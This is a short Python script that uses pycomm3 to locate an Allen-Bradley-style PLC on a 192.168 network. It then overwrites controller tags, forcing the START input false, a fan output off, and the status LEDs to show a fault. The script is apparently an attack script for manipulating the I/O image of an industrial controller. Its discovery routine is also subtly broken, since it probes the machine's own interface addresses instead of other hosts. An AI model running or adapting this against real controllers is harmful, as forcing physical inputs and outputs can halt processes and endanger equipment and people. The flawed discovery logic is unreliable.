import pycomm3
from pycomm3 import LogixDriver
import netifaces as ni
import socket

# Function to find the PLC's IP address
def find_plc_ip():
    # Get all network interfaces
    interfaces = ni.interfaces()
    for interface in interfaces:
        try:
            # Get the IP address of the interface
            ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
            # Check if the IP is in the local network
            if ip.startswith('192.168'):
                # Try to connect to the PLC
                plc = LogixDriver(ip)
                if plc.open():
                    print(f"PLC found at IP: {ip}")
                    plc.close()
                    return ip
        except Exception as e:
            continue
    return None

# Function to manipulate the I/O image
def manipulate_io_image(plc_ip):
    try:
        # Connect to the PLC
        plc = LogixDriver(plc_ip)
        plc.open()

        # Override the status of a physical discrete input
        # For example, override the START input to FALSE
        plc.write('START', False)

        # Override the status of a physical output
        # For example, force the Fan output to FALSE
        plc.write('_IO_EM_DO_02', False)

        # Override the status of the Green LED output
        plc.write('_IO_EM_DO_07', False)

        # Override the status of the Red LED output
        plc.write('_IO_EM_DO_06', True)

        # Close the connection
        plc.close()
        print("I/O image manipulation successful.")
    except Exception as e:
        print(f"Error manipulating I/O image: {e}")

# Main function
def main():
    # Find the PLC's IP address
    plc_ip = find_plc_ip()
    if plc_ip:
        # Manipulate the I/O image
        manipulate_io_image(plc_ip)
    else:
        print("PLC not found on the network.")

if __name__ == "__main__":
    main()